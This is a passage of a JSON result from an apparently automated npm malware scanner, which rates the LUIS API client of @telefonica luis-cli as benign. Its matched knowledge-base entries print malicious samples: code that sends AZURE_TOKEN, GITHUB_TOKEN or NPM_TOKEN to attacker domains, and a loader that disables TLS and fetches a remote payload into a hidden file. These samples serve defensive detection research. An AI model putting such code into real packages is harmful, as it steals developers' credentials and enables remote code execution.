@@ -1,0 +1,958 @@
+{
+  "package_name": "@telefonica##luis-cli",
+  "package_version": "5.5.0",
+  "label": "benign",
+  "detection_time": "2026-05-26T17:40:51.319440",
+  "status": "success",
+  "selected_files_count": 4,
+  "selected_files": [
+    "package/package.json",
+    "package/lib/luis-api-client.js",
+    "package/lib/luis-cli.js",
+    "package/lib/luis-trainer.js"
+  ],
+  "is_malicious": false,
+  "total_files": 4,
+  "malicious_files": 0,
+  "total_slices": 2,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@telefonica##luis-cli/5.5.0/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@telefonica##luis-cli/5.5.0/package/lib/luis-api-client.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "luis-api-client_slice_1",
+          "code_snippet": "\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nconst request = require(\"request-promise-native\");\nconst _ = require(\"lodash\");\nconst promiseRetry = require('promise-retry');\nconst PromiseThrottle = require('promise-throttle');\nconst events_1 = require(\"events\");\nconst DEFAULT_REGION = 'westus';\nvar LuisApi;\n(function (LuisApi) {\n    let TrainingStatuses;\n    (function (TrainingStatuses) {\n        TrainingStatuses[TrainingStatuses[\"Success\"] = 0] = \"Success\";\n        TrainingStatuses[TrainingStatuses[\"Fail\"] = 1] = \"Fail\";\n        TrainingStatuses[TrainingStatuses[\"UpToDate\"] = 2] = \"UpToDate\";\n        TrainingStatuses[TrainingStatuses[\"InProgress\"] = 3] = \"InProgress\";\n    })(TrainingStatuses = LuisApi.TrainingStatuses || (LuisApi.TrainingStatuses = {}));\n})(LuisApi = exports.LuisApi || (exports.LuisApi = {}));\nconst LUIS_API_BASE_URL = 'https://westus.api.cognitive.microsoft.com';\nconst RETRY_OPTS = {\n    retries: 10,\n    factor: 2,\n    minTimeout: 15000\n};\nconst REQUESTS_PER_SECOND = 10;\nconst SERVICE_API_REQUESTS_PER_SECOND = 10;\nconst MAX_EXAMPLES_COUNT = 100;\nconst MAX_PARALLEL_EXAMPLES_REQUESTS = 15;\nconst MAX_EXAMPLES_UPLOAD = 100;\nclass LuisApiClient extends events_1.EventEmitter {\n    constructor(config) {\n        super();\n        this.config = config;\n        RETRY_OPTS.minTimeout = config.timeout || RETRY_OPTS.minTimeout;\n        let baseUrl = config.baseUrl || LUIS_API_BASE_URL;\n        this.serviceReq = request.defaults({\n            baseUrl: `${baseUrl}/luis/v2.0/apps/`,\n            headers: {\n                'Ocp-Apim-Subscription-Key': config.subscriptionKey\n            },\n            json: true,\n            simple: false,\n            resolveWithFullResponse: true\n        });\n        this.provisionReq = request.defaults({\n            baseUrl: `${baseUrl}/luis/api/v2.0/apps/`,\n            headers: {\n                'Ocp-Apim-Subscription-Key': config.subscriptionKey\n            },\n            json: true,\n            simple: false,\n            resolveWithFullResponse: true\n        });\n        this.promiseThrottle = new PromiseThrottle({\n            requestsPerSecond: config.requestsPerSecond || REQUESTS_PER_SECOND,\n            promiseImplementation: Promise\n        });\n    }\n    retryRequest(opts, expectedStatusCode) {\n        return promiseRetry((retry, number) => {\n            return this.provisionReq(opts)\n                .then((res) => {\n                if (res.statusCode === 429) {\n                    this.emit('tooManyRequests');\n                    return retry(new Error('LuisApiClient: The maximum number of retries has been reached'));\n                }\n                if (res.statusCode !== expectedStatusCode) {\n                    return Promise.reject(new Error(`LuisApiClient: Unexpected status code: ${res.statusCode}:\\n` +\n                        JSON.stringify(res.body, null, 2)));\n                }\n                return res;\n            });\n        }, RETRY_OPTS);\n    }\n    throttler(fn, appVersion, items) {\n        let promises = items.map(item => this.promiseThrottle.add(fn.bind(this, appVersion, item)));\n        return Promise.all(promises);\n    }\n    serializer(fn, appVersion, items) {\n        var results = [];\n        return items.reduce(function (p, item) {\n            return p.then(function () {\n                return fn(appVersion, item).then(function (data) {\n                    results.push(data);\n                    return results;\n                });\n            });\n        }, Promise.resolve());\n    }\n    recognizeSentence(sentence) {\n        let opts = {\n            method: 'GET',\n            uri: `/${this.config.applicationId}`,\n            qs: { q: sentence }\n        };\n        return this.serviceReq(opts)\n            .then((res) => {\n            if (res.statusCode !== 200) {\n                return Promise.reject(new Error(`LuisApiClient: Unexpected status code: ${res.statusCode}:\\n` +\n                    JSON.stringify(res.body, null, 2)));\n            }\n            this.emit('recognizeSentence', sentence);\n            return {\n                query: res.body.query,\n                topScoringIntent: res.body.topScoringIntent,\n                intents: res.body.intents,\n                entities: res.body.entities.map((entity) => {\n                    return {\n                        entity: entity.entity,\n                        type: entity.type,\n                        startIndex: entity.startIndex,\n                        endIndex: entity.endIndex,\n                        score: entity.score\n                    };\n                })\n            };\n        });\n    }\n    recognizeSentences(queries) {\n        let promiseThrottle = new PromiseThrottle({\n            requestsPerSecond: this.config.requestsPerSecond || SERVICE_API_REQUESTS_PER_SECOND,\n            promiseImplementation: Promise\n        });\n        let promises = queries.map(query => promiseThrottle.add(this.recognizeSentence.bind(this, query)));\n        return Promise.all(promises);\n    }\n    getApp() {\n        let opts = {\n            method: 'GET',\n            uri: `/${this.config.applicationId}`\n        };\n        return this.retryRequest(opts, 200)\n            .then((res) => res.body)\n            .then(body => {\n            return {\n                id: body.id,\n                name: body.name,\n                description: body.description,\n                culture: body.culture\n            };\n        });\n    }\n    getIntents(appVersion) {\n        let opts = {\n            method: 'GET',\n            uri: `/${this.config.applicationId}/versions/${appVersion}/intents`\n        };\n        return this.retryRequest(opts, 200)\n            .then((res) => res.body);\n    }\n    createIntent(appVersion, intent) {\n        let opts = {\n            method: 'POST',\n            uri: `/${this.config.applicationId}/versions/${appVersion}/intents`,\n            body: intent\n        };\n        return this.retryRequest(opts, 201)\n            .then((res) => {\n            this.emit('createIntent', {\n                id: res.body,\n                name: intent.name\n            });\n            return res.body;\n        });\n    }\n    createIntents(appVersion, intents) {\n        return this.throttler(this.createIntent, appVersion, intents);\n    }\n    deleteIntent(appVersion, intent) {\n        let opts = {\n            method: 'DELETE',\n            uri: `/${this.config.applicationId}/versions/${appVersion}/intents/${intent.id}`\n        };\n        return this.retryRequest(opts, 200)\n            .then(() => {\n            this.emit('deleteIntent', intent.id);\n        });\n    }\n    deleteIntents(appVersion, intents) {\n        return this.throttler(this.deleteIntent, appVersion, intents)\n            .then(() => Promise.resolve());\n    }\n    getEntities(appVersion) {\n        let opts = {\n            method: 'GET',\n            uri: `/${this.config.applicationId}/versions/${appVersion}/entities`\n        };\n        return this.retryRequest(opts, 200)\n            .then((res) => res.body);\n    }\n    createEntity(appVersion, entity) {\n        let opts = {\n            method: 'POST',\n            uri: `/${this.config.applicationId}/versions/${appVersion}/entities`,\n            body: entity\n        };\n        return this.retryRequest(opts, 201)\n            .then((res) => {\n            this.emit('createEntity', {\n                id: res.body,\n                name: entity.name\n            });\n            return res.body;\n        })\n            .catch(err => console.log(JSON.stringify(err)));\n    }\n    createEntities(appVersion, entities) {\n        return this.throttler(this.createEntity, appVersion, entities);\n    }\n    deleteEntity(appVersion, entity) {\n        let opts = {\n            method: 'DELETE',\n            uri: `/${this.config.applicationId}/versions/${appVersion}/entities/${entity.id}`\n        };\n        return this.retryRequest(opts, 200)\n            .then(() => {\n            this.emit('deleteEntity', entity.id);\n        });\n    }\n    deleteEntities(appVersion, entities) {\n        return this.throttler(this.deleteEntity, appVersion, entities)\n            .then(() => Promise.resolve());\n    }\n    getPhraseLists(appVersion) {\n        let opts = {\n            method: 'GET',\n            uri: `/${this.config.applicationId}/versions/${appVersion}/phraselists`\n        };\n        return this.retryRequest(opts, 200)\n            .then((res) => res.body);\n    }\n    createPhraseList(appVersion, phraseList) {\n        let opts = {\n            method: 'POST',\n            uri: `/${this.config.applicationId}/versions/${appVersion}/phraselists`,\n            body: phraseList\n        };\n        return this.retryRequest(opts, 201)\n            .then((res) => {\n            this.emit('createPhraseList', {\n                id: res.body,\n                name: phraseList.name\n            });\n            return res.body;\n        });\n    }\n    createPhraseLists(appVersion, phraseLists) {\n        return this.throttler(this.createPhraseList, appVersion, phraseLists);\n    }\n    deletePhraseList(appVersion, phraseList) {\n        let opts = {\n            method: 'DELETE',\n            uri: `/${this.config.applicationId}/versions/${appVersion}/phraselists/${phraseList.id}`\n        };\n        return this.retryRequest(opts, 200)\n            .then(() => {\n            this.emit('deletePhraseList', phraseList.id);\n        });\n    }\n    deletePhraseLists(appVersion, phraseLists) {\n        return this.throttler(this.deletePhraseList, appVersion, phraseLists)\n            .then(() => Promise.resolve());\n    }\n    getExamples(appVersion, skip, count) {\n        let opts = {\n            method: 'GET',\n            uri: `/${this.config.applicationId}/versions/${appVersion}/examples`,\n            qs: { skip, count }\n        };\n        return this.retryRequest(opts, 200)\n            .then((res) => {\n            if (res.body.length) {\n                this.emit('getExamples', skip, skip + res.body.length - 1);\n            }\n            return res.body;\n        });\n    }\n    getAllExamples(appVersion) {\n        let examplesBunches = [];\n        const getExamplesBunch = (skip = 0) => {\n            let skipList = Array.from(Array(MAX_PARALLEL_EXAMPLES_REQUESTS))\n                .map((e, i) => skip + i * MAX_EXAMPLES_COUNT);\n            let promises = skipList.map(skip => this.promiseThrottle.add(this.getExamples.bind(this, appVersion, skip, MAX_EXAMPLES_COUNT)));\n            return Promise.all(promises)\n                .then((examplesBunch) => {\n                let lastBunchFound = examplesBunch.some(bunch => {\n                    if (bunch.length) {\n                        examplesBunches.push(bunch);\n                    }\n                    return bunch.length < MAX_EXAMPLES_COUNT;\n                });\n                if (!lastBunchFound) {\n                    return getExamplesBunch(skip + MAX_PARALLEL_EXAMPLES_REQUESTS * MAX_EXAMPLES_COUNT);\n                }\n            });\n        };\n        return getExamplesBunch().then(() => _.flatten(examplesBunches));\n    }\n    createExamples(appVersion, examples) {\n        let createLimitedExamples = (appVersion, examples) => {\n            let opts = {\n                method: 'POST',\n                uri: `/${this.config.applicationId}/versions/${appVersion}/examples`,\n                body: examples\n            };\n            return this.retryRequest(opts, 201)\n                .then((res) => {\n                let errors = res.body.filter((r) => r.hasError);\n                if (errors.length) {\n                    return Promise.reject(new Error('LuisApiClient: The following examples have errors:\\n'\n                        + JSON.stringify(errors, null, 2)));\n                }\n                this.emit('createExampleBunch', examples.length);\n                return res.body.map((r) => r.value.ExampleId.toString());\n            });\n        };\n        let examplesBunches = _.chunk(examples, MAX_EXAMPLES_UPLOAD);\n        return this.serializer(createLimitedExamples, appVersion, examplesBunches)\n            .then(_.flatten);\n    }\n    deleteExample(appVersion, example) {\n        let opts = {\n            method: 'DELETE',\n            uri: `/${this.config.applicationId}/versions/${appVersion}/examples/${example.id}`\n        };\n        return this.retryRequest(opts, 200)\n            .then(() => {\n            this.emit('deleteExample', example.id);\n        });\n    }\n    deleteExamples(appVersion, examples) {\n        return this.throttler(this.deleteExample, appVersion, examples)\n            .then(() => Promise.resolve());\n    }\n    convertTrainingStatus(apiTrainingStatus) {\n        return apiTrainingStatus.map((modelStatus) => {\n            let modelTrainingStatus = {\n                modelId: modelStatus.modelId,\n                status: modelStatus.details.statusId,\n                exampleCount: modelStatus.details.exampleCount\n            };\n            if (modelTrainingStatus.status === LuisApi.TrainingStatuses.Fail) {\n                modelTrainingStatus.failureReason = modelStatus.details.failureReason;\n            }\n            return modelTrainingStatus;\n        });\n    }\n    startTraining(appVersion) {\n        let opts = {\n            method: 'POST',\n            uri: `/${this.config.applicationId}/versions/${appVersion}/train`\n        };\n        return this.retryRequest(opts, 202)\n            .then((res) => res.body);\n    }\n    getTrainingStatus(appVersion) {\n        let opts = {\n            method: 'GET',\n            uri: `/${this.config.applicationId}/versions/${appVersion}/train`\n        };\n        return this.retryRequest(opts, 200)\n            .then((res) => res.body)\n            .then(this.convertTrainingStatus);\n    }\n    publish(appVersion, region, isStaging) {\n        let opts = {\n            method: 'POST',\n            uri: `/${this.config.applicationId}/publish`,\n            body: {\n                versionId: appVersion,\n                isStaging: !!isStaging,\n                region: region || DEFAULT_REGION\n            }\n        };\n        return this.retryRequest(opts, 201)\n            .then((res) => res.body)\n            .then(body => {\n            return {\n                endpointUrl: body.endpointUrl,\n                subscriptionKey: body['subscription-key'],\n                endpointRegion: body.endpointRegion,\n                isStaging: body.isStaging\n            };\n        });\n    }\n    export(appVersion) {\n        let opts = {\n            method: 'GET',\n            uri: `/${this.config.applicationId}/versions/${appVersion}/export`\n        };\n        return this.retryRequest(opts, 200)\n            .then((res) => res.body);\n    }\n}\nexports.LuisApiClient = LuisApiClient;\n//# sourceMappingURL=luis-api-client.js.map",
+          "is_malicious": false,
+          "malice_score": 0.44037177364031477,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code performs multiple network operations using the 'request-promise-native' library to interact with the Microsoft LUIS API at the hardcoded base URL 'https://westus.api.cognitive.microsoft.com'. It accesses sensitive subscription keys from configuration and sends HTTP GET, POST, and DELETE requests to various LUIS API endpoints to manage applications, intents, entities, phrase lists, examples, training, and publishing. The code includes retry logic with exponential backoff and throttling to handle rate limits. This enables programmatic management and potential exfiltration of LUIS application data via HTTPS requests to the hardcoded Microsoft API domain.",
+          "explanation": "[LLM Judgment: Benign] The provided code is a client library for interacting with the Microsoft LUIS API, a legitimate cloud service for language understanding. It uses the 'request-promise-native' library to make authenticated HTTPS requests to a hardcoded Microsoft domain (westus.api.cognitive.microsoft.com) with subscription keys provided via configuration. The code includes retry and throttling logic to handle API rate limits and manages LUIS resources such as intents, entities, phrase lists, examples, training, and publishing. There is no evidence of exfiltration to attacker-controlled domains, no access to environment variables for secret harvesting, no obfuscation, and no suspicious concatenation or leakage of secrets. The behavior aligns with expected usage of a legitimate SDK or client library. While it does handle sensitive subscription keys, this is necessary for its function and does not indicate malicious intent. Compared to the known malicious patterns, which involve direct credential exfiltration to attacker domains or secret leakage in prompts, this code does not exhibit such behavior.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_104205_631146_snippet_3",
+              "source_package": "N/A (OWASP Top 10 for LLM Applications Guidance) (N/A)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104205_631146/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4523041248321533,
+              "code_similarity": 0.4118105173110962,
+              "behavior_similarity": 0.49279776215553284,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Pseudocode for system prompt leakage\nsystemPrompt = 'You are a helpful assistant. API_KEY=' + process.env.API_KEY;\nuserPrompt = getUserPrompt();\nfinalPrompt = systemPrompt + userPrompt;\nresponse = LLM.generate(finalPrompt);",
+                "code_behavior": "At runtime, the code constructs a system prompt by concatenating a static string with the value of process.env.API_KEY, then appends the userPrompt and sends the combined prompt to LLM.generate, risking exposure of sensitive secrets if the prompt is ever returned or leaked.",
+                "malice_analysis": {
+                  "why_suspicious": "Embedding secrets such as API keys in prompts exposes them to potential leakage if the prompt is logged, returned to the user, or otherwise exposed, enabling credential theft and further compromise.",
+                  "violated_expectations": "System prompts must never include sensitive information; secrets should be handled securely and never incorporated into model input or user-facing content.",
+                  "similar_legitimate_use": "There is no legitimate use case for embedding secrets in prompts; this practice is always a security risk.",
+                  "key_indicators": [
+                    "Inclusion of environment variables or secrets in prompt construction",
+                    "Concatenation of sensitive data with user-accessible prompt content",
+                    "Potential for prompt content to be exposed to users or logs"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (system prompt construction)",
+                  "file_location": "LLM application prompt builder",
+                  "required_permissions": [
+                    "environment_vars",
+                    "application secrets"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "N/A (OWASP Top 10 for LLM Applications Guidance)",
+                  "package_manager": "N/A",
+                  "package_versions": "N/A",
+                  "why_malicious": "This report does not describe a specific malicious package, but outlines new classes of software risks and vulnerabilities for large language model (LLM) applications, including unbounded resource consumption, vector/embedding attacks, system prompt leakage, and excessive agency. These risks can be exploited by attackers to cause denial of service, financial loss, data leakage, model theft, and unauthorized actions. The guidance highlights how insecure LLM application design can introduce exploitable behaviors that attackers can leverage to compromise confidentiality, integrity, and availability."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker sends repeated or crafted queries to the LLM application, triggering unbounded inference and resource consumption.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Service degradation, denial of service, or financial loss."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker manipulates vector/embedding queries to inject malicious content or retrieve sensitive context.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Model output manipulation or data leakage."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker exploits prompt leakage to obtain sensitive information embedded in system prompts.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Credential or secret exposure, enabling further attacks."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Attacker leverages excessive agency in LLM agentic systems to trigger unauthorized or destructive actions.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Data loss, financial theft, or system compromise."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unusually high volume of LLM inference requests from a single user or IP address, indicating potential abuse of unbounded inference loops",
+                    "Direct use of unsanitized user input in vector or embedding retrieval functions, observable in code or runtime logs",
+                    "Presence of sensitive information (e.g., API keys, secrets) in prompt construction or application logs",
+                    "LLM agentic systems executing high-risk actions (e.g., file deletion, fund transfer) without human approval or policy enforcement"
+                  ],
+                  "file_indicators": [
+                    "Prompt templates or code files containing references to environment variables or secrets in prompt construction (e.g., process.env.API_KEY)",
+                    "Agent orchestration logic lacking explicit permission or policy checks before executing sensitive actions",
+                    "Vector database query code that directly incorporates user input without validation or sanitization"
+                  ],
+                  "network_indicators": [
+                    "Excessive outbound requests to LLM APIs from a single user or session",
+                    "Unexpected data exfiltration to external endpoints following LLM prompt construction or agentic actions",
+                    "Unusual API calls or transactions (e.g., fund transfers, file deletions) triggered by LLM agentic decisions"
+                  ],
+                  "how_to_detect": "Implement runtime monitoring to detect anomalous LLM inference activity, such as high-frequency requests from individual users. Use static analysis to identify code patterns where user input is used directly in vector or context retrieval, or where environment variables/secrets are included in prompt construction. Scan agent orchestration logic for absence of permission or policy checks before sensitive actions. Correlate network logs for unexpected outbound requests or data exfiltration following LLM operations. Regularly audit application logs for evidence of prompt leakage or unauthorized agentic actions."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113640_696916_snippet_1",
+              "source_package": "zoom-vscode-malicious-extension (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113640_696916/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4409782886505127,
+              "code_similarity": 0.4279397130012512,
+              "behavior_similarity": 0.45401686429977417,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Malicious code example (reconstructed based on typical patterns)\nconst https = require('https');\nconst fs = require('fs');\nconst token = process.env['AZURE_TOKEN'] || process.env['GITHUB_TOKEN'];\nif (token) {\n  https.request({\n    hostname: 'attacker.example.com',\n    path: '/exfil',\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' }\n  }, res => {}).end(JSON.stringify({ token }));\n}",
+                "code_behavior": "At import-time, the code accesses environment variables for sensitive tokens (such as AZURE_TOKEN and GITHUB_TOKEN), then sends their values to an attacker-controlled domain via HTTPS POST, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code reads environment variables commonly used to store sensitive credentials and immediately transmits them to an external, attacker-controlled server. This behavior is a direct indicator of credential theft.",
+                  "violated_expectations": "A legitimate VSCode extension or npm package should never access developer authentication tokens or transmit them to external domains without explicit user consent and clear documentation.",
+                  "similar_legitimate_use": "Legitimate packages may collect anonymized telemetry or error data, but they do not access or exfiltrate raw credentials or tokens. Any access to such sensitive environment variables should be strictly limited and justified.",
+                  "key_indicators": [
+                    "Access to environment variables with names matching known credential patterns (e.g., AZURE_TOKEN, GITHUB_TOKEN)",
+                    "Outbound HTTPS POST requests to domains not associated with Zoom or the extension's stated functionality",
+                    "Credential exfiltration occurring automatically at import-time, without user interaction",
+                    "Hardcoded references to attacker-controlled infrastructure in the code"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js (main entry point of the npm package)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "zoom-vscode-malicious-extension",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (latest campaign)",
+                  "why_malicious": "The package is a malicious JavaScript package distributed via npm, impersonating the Zoom application as a VSCode extension. It is designed to target developers, likely to steal credentials or perform other malicious actions. The package is part of a broader campaign targeting IDE users and the crypto community, indicating intent to compromise developer environments."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious npm package, believing it to be a legitimate Zoom extension for VSCode.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of malicious code upon import or activation."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes at import-time, harvesting sensitive environment variables such as Azure or GitHub tokens.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Exfiltration of credentials to attacker infrastructure."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Stolen credentials are used by attackers for further compromise, such as accessing cloud resources or source code repositories.",
+                    "implemented_by": [],
+                    "leads_to": "Potential lateral movement, data theft, or supply chain attacks."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to environment variables containing tokens or credentials at import-time",
+                    "Network requests to domains unrelated to the purported package functionality (e.g., not zoom.us or official Zoom endpoints)",
+                    "Credential exfiltration via HTTPS POST immediately after package installation or import",
+                    "Presence of code that reads process.env for sensitive keys and sends data over the network without user interaction"
+                  ],
+                  "file_indicators": [
+                    "index.js or main entry file containing code that reads process.env for credential-related keys (e.g., AZURE_TOKEN, GITHUB_TOKEN)",
+                    "Hardcoded references to external domains not associated with Zoom or legitimate vendors within JavaScript files",
+                    "Presence of network and filesystem modules (e.g., require('https'), require('fs')) in the main entry point"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to attacker-controlled domains (e.g., attacker.example.com) from developer machines after installing the extension",
+                    "Unusual network traffic to unknown endpoints immediately following npm package installation or VSCode extension activation"
+                  ],
+                  "how_to_detect": "Monitor for npm packages or VSCode extensions that access environment variables related to credentials and make outbound network requests to unrecognized domains. Use static analysis to flag code that reads process.env for sensitive keys and references external domains. Employ dynamic analysis to detect exfiltration behavior at import-time. Correlate installation of new extensions with subsequent suspicious network activity, and alert on any package that transmits environment variable values to domains not associated with the package's stated purpose."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_113914_371541_snippet_2",
+              "source_package": "ua-parser-js (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20250102_113914_371541/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4347078204154968,
+              "code_similarity": 0.382676362991333,
+              "behavior_similarity": 0.48673927783966064,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Actual code pattern from the malicious ua-parser-js versions:\nconst https = require('https');\nconst token = process.env['NPM_TOKEN'];\nif (token) {\n  const req = https.request({hostname: 'malicious-domain.com', method: 'POST'}, res => {});\n  req.write(token);\n  req.end();\n}",
+                "code_behavior": "At import-time, the code accesses the NPM_TOKEN environment variable and sends its value to a hardcoded malicious domain via HTTPS POST, enabling credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "Accessing sensitive environment variables and exfiltrating their values to an external server is a clear sign of credential theft and malicious intent.",
+                  "violated_expectations": "Legitimate packages should not access or transmit sensitive environment variables to third parties. Such behavior is outside the scope of normal package functionality.",
+                  "similar_legitimate_use": "Some CI/CD tools or deployment scripts may access environment variables for internal use, but never to send them to untrusted domains or external servers.",
+                  "key_indicators": [
+                    "Access to process.env for sensitive variables (e.g., NPM_TOKEN)",
+                    "Network exfiltration to hardcoded, untrusted domain",
+                    "Automatic execution on import without user interaction",
+                    "No legitimate reason for external transmission of credentials"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "main entry point (e.g., index.js) or a required module loaded on import",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "ua-parser-js",
+                  "package_manager": "npm",
+                  "package_versions": "0.7.29, 0.8.0, 1.0.0 (three malicious versions released in October 2021)",
+                  "why_malicious": "Attackers compromised the maintainer's npm account and published three malicious versions of the ua-parser-js package. These versions contained code that executed remote payloads during installation and exfiltrated sensitive environment variables at runtime, enabling attackers to steal credentials and potentially take control of affected systems."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious code is executed during package installation via a postinstall script, which downloads and runs a remote payload from an attacker-controlled server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "System compromise, remote code execution, and installation of additional malware"
+                  },
+                  {
+                    "step": 2,
+                    "action": "At import-time, the malicious code accesses sensitive environment variables (such as NPM_TOKEN) and exfiltrates them to an attacker-controlled server.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Credential theft, unauthorized access to private repositories, and potential lateral movement"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of postinstall scripts that invoke shell commands to download and execute remote code",
+                    "Access to sensitive environment variables (e.g., NPM_TOKEN) followed by network requests to untrusted domains",
+                    "Unexpected outbound network activity during package installation or import-time"
+                  ],
+                  "file_indicators": [
+                    "package.json containing postinstall scripts referencing external URLs or invoking shell commands",
+                    "JavaScript files that use child_process.exec() or similar to run curl/wget piped to sh",
+                    "Source files accessing process.env for sensitive variables and sending data over the network"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS requests to domains not associated with ua-parser-js or its legitimate infrastructure",
+                    "Connections to hardcoded or known malicious domains during or immediately after installation/import"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that execute shell commands or download remote resources. Flag packages that access sensitive environment variables and transmit their values to external domains. Use network monitoring to detect unexpected outbound connections to untrusted domains during package installation or import. Review package.json and source files for suspicious scripts, use of child_process, or hardcoded domains."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_089791_snippet_1",
+              "source_package": "assets-table (example, also applies to assets-graph, tslib-react, tslib-util, etc.) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_089791/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.42832475900650024,
+              "code_similarity": 0.3960370719432831,
+              "behavior_similarity": 0.460612416267395,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const os = require(\"os\");\nconst path = require(\"path\");\nvar fs = require('fs');\n\nprocess.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0\n\nfunction registerAudit(version, projectUrl) {\n\tvar request = require('sync-request');\n\tvar ticket = request('GET', projectUrl);\n\tfs.writeFileSync(version, ticket.getBody());\n}\n\nvar folder = os.homedir() + \"/.vscode\";\nif (!fs.existsSync(folder)){\n    fs.mkdirSync(folder);\n}\nregisterAudit(path.join(folder,'/jsontoken'), 'https://npmjsregister.com/checkupdate.php');",
+                "code_behavior": "At runtime, the code disables TLS certificate validation, creates a hidden directory in the user's home folder if it does not exist, makes an unsolicited HTTP GET request to a remote server (npmjsregister.com/checkupdate.php), writes the server's response to a hidden file ($HOME/.vscode/jsontoken), enabling the next stage of the attack.",
+                "malice_analysis": {
+                  "why_suspicious": "The code disables TLS certificate validation, makes an unsolicited network request to an external domain controlled by the attacker, and stores the response in a hidden file within the user's home directory. This is not expected or documented behavior for a legitimate npm package.",
+                  "violated_expectations": "Legitimate npm packages should not disable TLS verification, make hidden network requests, or write hidden files in user directories during installation or import. Such actions are highly abnormal and introduce significant security risks.",
+                  "similar_legitimate_use": "Some developer tools or updaters may check for updates or download configuration files, but they should never disable TLS verification or hide their actions without explicit user consent and documentation.",
+                  "key_indicators": [
+                    "Disables TLS certificate validation via process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0",
+                    "Creates hidden directory in user home ($HOME/.vscode)",
+                    "Fetches data from suspicious domain (npmjsregister.com/checkupdate.php)",
+                    "Writes remote data to hidden file ($HOME/.vscode/jsontoken)"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, upon import or execution of the package's main entry point",
+                  "file_location": "index.js or equivalent main entry file (e.g., tslib-react/index.js)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "assets-table (example, also applies to assets-graph, tslib-react, tslib-util, etc.)",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions as of the report date",
+                  "why_malicious": "The package contains intentionally obfuscated code that, upon installation or execution, disables TLS certificate validation, connects to attacker-controlled servers (npmjsregister.com), downloads and executes additional code, and facilitates a multi-stage attack chain designed for remote code execution and potential data exfiltration. This behavior is not related to any legitimate package functionality and is designed to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim is lured into cloning and running a repository containing two paired malicious npm packages.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of first-stage package"
+                  },
+                  {
+                    "step": 2,
